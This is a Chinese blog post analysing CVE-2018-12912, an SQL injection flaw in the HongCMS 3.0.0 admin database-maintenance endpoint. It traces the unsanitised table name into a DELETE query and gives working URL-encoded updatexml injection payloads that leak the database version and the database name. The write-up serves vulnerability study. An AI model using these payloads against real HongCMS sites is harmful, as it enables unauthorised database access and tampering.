<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> HongCMS 3.0.0 SQL注入漏洞 · GFAlisa'Blog</title><meta name="description" content="HongCMS 3.0.0 SQL注入漏洞 - GFAlisa"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="GFAlisa'Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/gfalisa" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HongCMS 3.0.0 SQL注入漏洞</h1><div class="post-info">Mar 23, 2018</div><div class="post-content"><hr>
<a id="more"></a>
<h4 id="CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞"><a href="#CVE-2018-12912-HongCMS-3-0-0-SQL注入漏洞" class="headerlink" title="CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞"></a>CVE-2018-12912-HongCMS 3.0.0 SQL注入漏洞</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 </p>
<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<h5 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h5><p>根据exploit-db给出的exp进行分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
<p>根据exp地址是/admin/index.php/database目录下，所以我们使用phpstorm打开，使用全局搜索查找operate参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">public function index()&#123;</div><div class="line">		$this-&gt;PrintInstructions();</div><div class="line"></div><div class="line">		echo &apos;&lt;form method=&quot;post&quot; action=&quot;&apos;.BURL(&apos;database/operate&apos;).&apos;&quot; name=&quot;tables&quot;&gt;</div><div class="line">		&lt;input type=&quot;hidden&quot; name=&quot;dbaction&quot; value=&quot;&quot;&gt;&apos;;</div><div class="line"></div><div class="line">		TableHeader(&apos;数据库列表&apos;);</div><div class="line">		TableRow(array(&apos;选择&apos;, &apos;表名称&apos;, &apos;记录数&apos;, &apos;数据大小&apos;, &apos;索引大小&apos;, &apos;空闲&apos;, &apos;操作&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;), &apos;tr0&apos;);</div><div class="line"></div><div class="line">		$recordsize = $datasize = $indexsize = $freesize = 0;</div><div class="line">		.....</div></pre></td></tr></table></figure>
<p>这里的BURL(‘database/operate’)和我们的exp的url的参数相似，所以我们跟进BURL()函数，发现是对url进行伪静态处理。</p>
<p>接下来我们对dbaction参数进行分析，老样子进行全局搜索，发现出现在这最多</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while($tableinfo = $this-&gt;db-&gt;fetch($gettables))&#123;</div><div class="line">			TableRow(array(&apos;&lt;input type=&quot;checkbox&quot; name=&quot;tablenames[]&quot; value=&quot;&apos; . $tableinfo[&apos;Name&apos;] . &apos;&quot;&gt;&apos;, </div><div class="line">				$tableinfo[&apos;Name&apos;], </div><div class="line">				$tableinfo[&apos;Rows&apos;], </div><div class="line">				DisplayFilesize($tableinfo[&apos;Data_length&apos;]), </div><div class="line">				DisplayFilesize($tableinfo[&apos;Index_length&apos;]), </div><div class="line">				Iif($tableinfo[&apos;Data_free&apos;] &gt; 0, &apos;&lt;b&gt;&apos; . DisplayFilesize($tableinfo[&apos;Data_free&apos;]) . &apos;&lt;/b&gt;&apos;, 0), </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=checktable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;查错&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=optimizetable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;优化&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=repairtable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;修复&lt;/a&gt;&apos;, </div><div class="line">				&apos;&lt;a href=&quot;&apos;.BURL(&apos;database/operate?dbaction=backuptable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]) . &apos;&quot;&gt;备份&lt;/a&gt;&apos;, </div><div class="line">				Iif($tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;sessions&apos; OR $tableinfo[&apos;Name&apos;] == TABLE_PREFIX . &apos;vvc&apos;, &apos;&lt;a href=&quot;#&quot; onclick=&quot;&apos;.Confirm(&apos;确定清空此数据库表 &apos; . $tableinfo[&apos;Name&apos;] . &apos; 吗?&apos;, &apos;database/operate?dbaction=emptytable&amp;tablename=&apos; . $tableinfo[&apos;Name&apos;]).&apos;&quot;&gt;清空&lt;/a&gt;&apos;)));</div></pre></td></tr></table></figure>
<p>TABLE_PREFIX . ‘vvc’ 这个就是exp中的hong_vvc，由于满足条件所以执行到下面的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public function operate()&#123;</div><div class="line">		$action = ForceStringFrom(&apos;dbaction&apos;);</div><div class="line">		$tablename = ForceStringFrom(&apos;tablename&apos;);</div><div class="line"></div><div class="line">		switch ($action)&#123;</div><div class="line">			case &apos;checktable&apos;:</div><div class="line">				$this-&gt;PrintResults(&apos;数据库表查错&apos;, $this-&gt;TableOperation($tablename, &apos;CHECK&apos;));</div><div class="line">				break;</div><div class="line">				......</div><div class="line">case &apos;emptytable&apos;:</div><div class="line">				$this-&gt;PrintResults(&apos;数据库表清空&apos;, $this-&gt;EmptyTable($tablename));</div><div class="line">				break;</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
<p>当case = emptytable时，执行了$this-&gt;EmptyTable($tablename)，我们分析下EmptyTable方法的内容，发现使用了``，所以可以使用url编码进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">private function EmptyTable($tablename)&#123;</div><div class="line">		$this-&gt;db-&gt;exe(&quot;DELETE FROM `$tablename`&quot;);</div><div class="line">		$msg = &apos;已完成清空数据库表: &apos; . $tablename . &apos;&lt;br/&gt;&apos;;</div><div class="line"></div><div class="line">		return $msg;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<h5 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h5><p>HongCMS下载地址<a href="https://github.com/Neeke/HongCMS/" target="_blank" rel="external">https://github.com/Neeke/HongCMS/</a></p>
<p>按照github作者的安装方法安装HongCMS系统</p>
<p>安装完成进入管理员后台，找到数据库维护页面</p>
<p><img src="https://s1.ax1x.com/2018/08/30/PjSH1O.png" alt=""></p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28version%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
<p>解码得</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc` where vvcid=1 or updatexml(2，concat(0x7e，(version()))，0) or `</div></pre></td></tr></table></figure>
<p>所以我们可以查看数据库的版本号</p>
<p><img src="https://s1.ax1x.com/2018/08/30/PjSbcD.png" alt=""></p>
<p>或者查询下当前数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/index.php/database/operate?dbaction=emptytable&amp;tablename=hong_vvc%60%20where%20vvcid%3D1%20or%20updatexml%282%2Cconcat%280x7e%2C%28database%28%29%29%29%2C0%29%20or%20%60</div></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2018/08/30/PjS79K.png" alt=""></p>
</div></article></div></main><footer><div class="paginator"><a href="/2018/03/23/Meterpreter使用记录/" class="prev">PREV</a><a href="/2018/03/23/MySQL语法/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="http://yoursite.com">GFAlisa</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>